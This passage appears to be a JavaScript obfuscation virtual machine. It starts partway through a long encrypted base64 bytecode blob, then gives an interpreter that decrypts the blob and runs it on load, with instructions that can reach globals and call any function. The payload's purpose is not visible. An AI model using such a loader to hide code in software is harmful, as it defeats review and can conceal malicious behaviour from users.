pBu6qhIRqqu6Ov70VFVtqguqqAkeOzs+JzN6H3QDdHAVy63YAAG5uQi5vaUUpWRgdQUFxq+q2trJERALCwsnREpaWRkfdAN0cBXLrdYOD7e0e8raEhHa28o6/vRERX26C7q+EKChYWB2BgbFrKpiYmICACgsPzRGCXxs367GphanZmBzyMkJJBwXAwkIcne3v72ip9fX0XR1xrWwoKClZ2a+v2nY32dmvr2bOPnw9BQGxbYAsLGykuJRW1h4JFJZUcHsOTiwIVD1hAdscx8BAuiG6gQFhuGRfx0eoKGtbWzPx+H6++hBabm5qSQjLT0+fx90A3RwFdu+xQ0Pp6cYuqkREQsLCzv+9FRWbqkIqq21F7UHABYGBrXf2WFiYgIAKCw/NEYJfGzPvdUQsLICABUFBbbR1MTEwhcVtsbDs7O2ZGaurGrIzGRmrq6IO4mDhxcGA3Fx0dPTgVHw8fnZCSUDCACQvxoYE+2AdFYmJ2h6OzsgIUf2hPPb/ZOTnj4/qnp21AUCAgIQEBDJ3eIxOzInJWBrf3ZasLCn2rN6WjQhLiJjQyhNNHc+JmMamvIBIyMDAIOhiX0edjM7Lm90eDsue3l1NjYsfmggbxg4QS40YzM4OC9ufGJ0NjM4MCcgMHl3bDg4ODc6PTt6fHAkPypgFKCipiYkh4yYWVtbWkgpLD80Rgl8bO+e9pYWlwYAFQUFlvL35+fhFBUDcXHR0NUnJo6PKaivJyaOjas4qaCkFAaV5uDw8PCi4mFraEgl09jQUDA4Pn4tzcag5Gfm4ODnAXUeHR7onP4tLLIjLi4ugBEBERG4nM9lxAEHp6al1tB5dFktjYWK0Nb29vMnJqXMymJjZq6vpMLEBBaF4ucXBZZycsLDyCornQwGlfibZQN0cBVzah18d5Pt6mNqgwMFhuWMaRluD+OEBJSWkxMVhuKSfB0e2K/NbmzCYG5ubtByYRERqIeGPI6Frg4GtcXDeAAALzg+joygw8Xl5eAkJrXf2WFjZr68t9HX5+f3MTO2FAWm1tOzs7ugoqQEBqXLqGYDdHAVc2ob8/H64pJ8HR6o37d0dq6setjcdHaurbsdoKKqqapkCXVWJidoejs7ICFHIOOVt9LUpKSi19RkE2UdHq7Zotoa2LCyYmBzExPFFwbVpaPT09W3tHgfdAN0cBXbvssDAamqC6muthe1BwAFtbe03NnJycmohLa0sqsXhCQgNgYGpczKYmJiAgAoLD80Rgl8bP+OBxeHhiYgNQUFpsLH9/fxNDWm1dDAwMUnJp6fKbi/Jyaenbs4mZCUFAECcHDg4OCy0kFLSGgnsrmxwW75yaHSMhMmVlZGCXxsD3gHF5f29GQBAmdnBwOA5Of18ODg5ff/b/75n/f/bUxZubC0FAaF9vAQHT5JWTpGbx8ff3gHF5f29GQFhuLnBwUPdIzs/DUq1BQGxbaw4ODmhId7H3QDdGho+Pn4AAGZmQiZnYUUhSQgNQUFps/K+vrpERCLipo6v7Ghov4fdAN0HByMjfYOD5eUO6q6EhG6u6o6/vRkZV2aC5qehhSFJCA2BgalzMpiAQIKCCgsPzRGCXxs/47mhhaHJiA1BQWmwsf39/E0NabV0MDAxScmngCwsbcnJp6duziZkJQUBqXW0ODg4LKCERsYODj78Pi46CtSNQBAJzdkCi1ZeWlvITtwJCU4cX5+dWRjczs4KSk4MSMuImdieGVpMDsnfFwVAwoPNTU=';
//end preprocessor
(function(){

	var bootPayload = [];
	{
		let chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
		let str = String(pl).replace(/[=]+$/, '');
	    let tmp = 0;
	    for (let bc = 0, bs, buffer, idx = 0; buffer = str.charAt(idx++);~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer,bc++ % 4) ? (tmp = (255 & bs >> (-2 * bc & 6)), bootPayload.push(tmp), tmp) : 0) {
	    	buffer = chars.indexOf(buffer);
	    }
	}

	class Context {
		constructor(global, payload, registers, variables) {
			this.g = global;
			this.p = payload;
			this.r = registers || [];
			if(registers == null) {
				this.r[2] = undefined;
				this.r[1] = [{h: 0, t: global, f: null}];
				this.r[0] = 0;
			}
			this.v = variables || {};
			this.s = 0;
			this.d = 0;
			this.f = 0;
			this.t = [];
		}
	}
	let v = {g: this};
	v.g.ct = Context;

	let globalContext = new Context(glob, bootPayload, null, v);

	function decrypt(ctx, i) {
	  let si = (i / 40) | 0;
	  let sd = i - si * 40;
	  if(sd < ctx.d || ctx.f != si || ctx.d >= 40) {
	    ctx.d = 0;
	    ctx.f = si;
	    ctx.s = 0;
	    ctx.t = [];
	  }
	  let decResult = 0;
		if(i < 0) throw 'this is a dummy throw to fix a babel-minify bug';
	  for(; ctx.d <= sd; ctx.d++) {
	    decResult = ctx.p[ctx.d + (si * 40)] ^ ctx.s;
	    ctx.t.push(decResult);
	    if(ctx.d < 4) {
	      ctx.s ^= ctx.t[ctx.d];
	    }else {
	      ctx.s ^= ctx.t.splice(0, 1)[0] ^ ctx.t[ctx.t.length - 1];
	    }
	  }
	  return decResult;
	}
	v.g.d = decrypt;

	function readVarInt(ctx, i) {
	    let output = 0;
	    let v2 = 0;
	    let v3 = 0;
	    do {
	        v3 = decrypt(ctx, v2 + i);
	        output |= (v3 & 127) << (v2++ * 7);
	        if(v2 > 5) return {o: output, c: v2};
	    }while((v3 & 128) == 128);
	    return {o: output, c: v2};
	}
	v.g.rvi = readVarInt;

	let lastDecodePos = 0;

	function safeZero() {
		return 0;
	}
	v.g.sz = safeZero;

	function safeArray() {
		return [];
	}
	v.g.sa = safeArray;

	function nextReadLocation(ctx) {
		let depth = 0;
		let reg = safeZero() << 4;
		if(reg != 0) throw 'this is a dummy throw to fix a babel-minify bug';
		while(depth++ < 127 && reg & 7 == 1) {
			reg = ctx.r[reg >> 4];
		}
		if(reg & 7 == 1) {
			throw "Circular pointer";
		}
		if(reg & 0b00000111 != 0) {
			throw "Unexpected constant";
		}
		return reg;
	}
	v.g.nr = nextReadLocation;

	function decodeByte(ctx) {
		let reg = nextReadLocation(ctx);
		let r = Math.round(ctx.r[reg >> 4]);
		if(r >= ctx.p.length || r < 0) {
			return -1;
		}
		ctx.r[reg >> 4] = r + 1;
		lastDecodePos = r;
		return decrypt(ctx, r);
	}
	v.g.db = decodeByte;

	function decode(ctx) {
		let reg = nextReadLocation(ctx);
		let r = Math.round(ctx.r[reg >> 4]);
		if(r >= ctx.p.length || r < 0) {
			return -1;
		}
		let ret = readVarInt(ctx, r);
		ctx.r[reg >> 4] = r + ret.c;
		lastDecodePos = r;
		return ret.o;
	}
	v.g.dg = decode;

	function readRegister(ctx) {
		return decode(ctx) >> 4;
	}
	v.g.dr = readRegister;

	function readArg(ctx) {
		let b = decode(ctx);
		if(b < 0) throw 'this is a dummy throw to fix a babel-minify bug';
		let depth = 0;
		while(depth++ < 127 && b & 7 == 1) {
			b = ctx.r[b >> 4];
		}
		if(b & 7 == 1) {
			throw "Circular register pointer";
		}
		if(b === 2) {
			let buf = new ArrayBuffer(8);
			let u8 = new Uint8Array(buf);
			u8[7] = decodeByte(ctx);
			u8[6] = decodeByte(ctx);
			u8[5] = decodeByte(ctx);
			u8[4] = decodeByte(ctx);
			u8[3] = decodeByte(ctx);
			u8[2] = decodeByte(ctx);
			u8[1] = decodeByte(ctx);
			u8[0] = decodeByte(ctx);
			let f64 = new Float64Array(buf);
			return f64[0];
		}else if(b === 3) {
			let strc = safeArray();
			if(strc.length != 0) throw 'this is a dummy throw to fix a babel-minify bug';
			for(let i = 0; (i = decodeByte(ctx)) != 0;) {
				strc.push(String.fromCharCode(i));
			}
			return strc.join('');
		}else if(b === 4) {
			return true;
		}else if(b === 5) {
			return false;
		}else if(b === 6) {
			return null;
		}else if(b === 7) {
			return undefined;
		}else if(b === 8) {
			let b = decodeByte(ctx);
			return b > 127 ? b -= 256 : b;
		}else if(b === 9) {
			let b = decodeByte(ctx) << 8 | decodeByte(ctx);
			return b > 32767 ? b -= 65536 : b;
		}else if(b === 10) {
			let b = decodeByte(ctx) << 16 | decodeByte(ctx) << 8 | decodeByte(ctx);
			return b > 8388607 ? b -= 16777216 : b;
		}else if(b === 11) {
			let b = decodeByte(ctx) << 24 | decodeByte(ctx) << 16 | decodeByte(ctx) << 8 | decodeByte(ctx);
			return b > 2147483647 ? b -= 4294967296 : b;
		}
		return ctx.r[b >> 4];
	}
	v.g.da = readArg;

	let lastInstruction = 0;
	function readInstruction(ctx) {
		let r = decode(ctx);
		lastInstruction = lastDecodePos;
		if(r < 0) return null;
		if(r >= instructions.length) {
			throw "Invalid instruction, ISN# " + r;
		}
		return instructions[r];
	}
	v.g.di = readInstruction;

	function writeArg(ctx, value) {
		ctx.r[readRegister(ctx)] = value;
	}
	v.g.qa = writeArg;

	let instructions = []
	//arithmatic
	//add
	if(INS_add)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) + readArg(ctx));
		});
	//sub
	if(INS_sub)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) - readArg(ctx));
		});
	//mul
	if(INS_mul)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) * readArg(ctx));
		});
	//div
	if(INS_div)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) / readArg(ctx));
		});
	//mod
	if(INS_mod)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) % readArg(ctx));
		});

	//boolean arithmatic
	//or
	if(INS_or)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) || readArg(ctx));
		});
	//and
	if(INS_and)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) && readArg(ctx));
		});
	//not
	if(INS_not)
		instructions.push(function(ctx) {
			writeArg(ctx, !readArg(ctx));
		});

	//bit arithmatic
	//shr
	if(INS_shr)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) >> readArg(ctx));
		});
	//shl
	if(INS_shl)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) << readArg(ctx));
		});
	//shrz
	if(INS_shrz)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) >>> readArg(ctx));
		});
	//bit_or
	if(INS_bit_or)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) | readArg(ctx));
		});
	//bit_and
	if(INS_bit_and)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) & readArg(ctx));
		});
	//bit_xor
	if(INS_bit_xor)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) ^ readArg(ctx));
		});
	//bit_not
	if(INS_bit_not)
		instructions.push(function(ctx) {
			writeArg(ctx, ~readArg(ctx));
		});

	//register management
	//mov
	if(INS_mov)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx));
		});
	//xchg
	if(INS_xchg)
		instructions.push(function(ctx) {
			let r1 = readRegister(ctx);
			let r2 = readRegister(ctx);
			let v1 = ctx.r[r1];
			ctx.r[r1] = ctx.r[r2];
			ctx.r[r2] = v1;
		});

	//JS interface
	//global
	if(INS_global)
		instructions.push(function(ctx) {
			writeArg(ctx, ctx.g);
		});
	//getprop
	if(INS_getprop)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx)[readArg(ctx)]);
		});
	//setprop
	if(INS_setprop)
		instructions.push(function(ctx) {
			readArg(ctx)[readArg(ctx)] = readArg(ctx);
		});
	//in
	if(INS_in)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) in readArg(ctx));
		});
	//delete
	if(INS_delete)
		instructions.push(function(ctx) {
			delete readArg(ctx)[readArg(ctx)];
		});
	//instanceof
	if(INS_instanceof)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) instanceof readArg(ctx));
		});
	//typeof
	if(INS_typeof)
		instructions.push(function(ctx) {
			writeArg(ctx, typeof readArg(ctx));
		});
	//call_0
	if(INS_call_0)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, []));
		});
	//call_1
	if(INS_call_1)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx)]));
		});
	//call_2
	if(INS_call_2)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx)]));
		});
	//call_3
	if(INS_call_3)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_4
	if(INS_call_4)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_5
	if(INS_call_5)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_6
	if(INS_call_6)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_7
	if(INS_call_7)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_8
	if(INS_call_8)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_9
	if(INS_call_9)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_10
	if(INS_call_10)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//obj
	if(INS_obj)
		instructions.push(function(ctx) {
			writeArg(ctx, {});
		});
	//arr
	if(INS_arr)
		instructions.push(function(ctx) {
			writeArg(ctx, []);
		});
	//null
	if(INS_null)
		instructions.push(function(ctx) {
			writeArg(ctx, null);
		});
	//undefined
	if(INS_undefined)
		instructions.push(function(ctx) {
			writeArg(ctx, undefined);
		});
	//regex
	if(INS_regex)
		instructions.push(function(ctx) {
			writeArg(ctx, new RegExp(readArg(ctx), readArg(ctx)));
		});
	//true
	if(INS_true)
		instructions.push(function(ctx) {
			writeArg(ctx, true);
		});
	//false
	if(INS_false)
		instructions.push(function(ctx) {
			writeArg(ctx, false);
		});
	//protokeys
	if(INS_protokeys)
		instructions.push(function(ctx) {
			let obj = readArg(ctx);
			let ret = [];
			for(let x in obj) {
				ret.push(x);
			}
			writeArg(ctx, ret);
		});

	//comparison
	//eq
	if(INS_eq)
		instructions.push(function(ctx) {
			let a1 = readArg(ctx);
			let a2 = readArg(ctx);
			writeArg(ctx, a1 == a2 || ((a1 == undefined || a2 == undefined) && (a1 == 0 || a2 == 0)));
		});
	//eq_typed
	if(INS_eq_typed)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) === readArg(ctx));
		});
	//neq
	if(INS_neq)
		instructions.push(function(ctx) {
			let a1 = readArg(ctx);
			let a2 = readArg(ctx);
			writeArg(ctx, a1 != a2 && !((a1 == undefined || a2 == undefined) && (a1 == 0 || a2 == 0)));
		});
	//neq_typed
	if(INS_neq_typed)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) !== readArg(ctx));
		});
	//le
	if(INS_le)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) < readArg(ctx));
		});
	//gr
	if(INS_gr)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) > readArg(ctx));
		});
	//leeq
	if(INS_leeq)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) <= readArg(ctx));
		});
	//greq
	if(INS_greq)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) >= readArg(ctx));
		});

	//branching
	//jmp
	if(INS_jmp)
		instructions.push(function(ctx) {
			ctx.r[0] = readArg(ctx);
		});
	//jz
	if(INS_jz)
		instructions.push(function(ctx) {
			let a = readArg(ctx);
			if(a == 0 || a == undefined) {
				ctx.r[0] = readArg(ctx);
			}else{
				readArg(ctx);
			}
		});
	//jnz
	if(INS_jnz)
		instructions.push(function(ctx) {
			let a = readArg(ctx);
			if(a != 0 && a != undefined) {
				ctx.r[0] = readArg(ctx);
			}else{
				readArg(ctx);
			}
		});

	//variables
	//setvar
	if(INS_setvar)
		instructions.push(function(ctx) {
			ctx.v[readArg(ctx)] = readArg(ctx);
		});
	//getvar
	if(INS_getvar)
		instructions.push(function(ctx) {
			writeArg(ctx, ctx.v[readArg(ctx)]);
		});

	//VM interface
	//context
	if(INS_context)
		instructions.push(function(ctx) {
			writeArg(ctx, ctx);
		});

	//debugging
	//report
	if(INS_report)
		instructions.push(function(ctx) {
			console.log('reported:', readArg(ctx));
		});
	//dump
	if(INS_dump)
		instructions.push(function(ctx) {
			for(let i = 0; i < ctx.r.length; i++) {
				console.log(i + ':', readArg(ctx));
			}
		});

	//obfuscation related
	//nop
	if(INS_nop)
		instructions.push(function(ctx) {

		});
	if(INS_obf_pushx) // incapable of being properly assembled at this time, used to obfuscate
		instructions.push(function(ctx) {
			let c = readArg(ctx);
			let b = [];
			for(let i = 0; i < c; i++) {
				b.push(readArg(ctx));
			}
			writeArg(ctx, b);
		});
	v.g.is = instructions;

	function runContext(ctx) {
		let ins = null;
		try{
			while((ins = readInstruction(ctx)) != null) {
				ins(ctx);
			}
		}catch(e) {
			console.log(e, 'LOC: ' + lastInstruction)
		}
	}
	v.g.rc = runContext;
	runContext(globalContext);
}).call({});
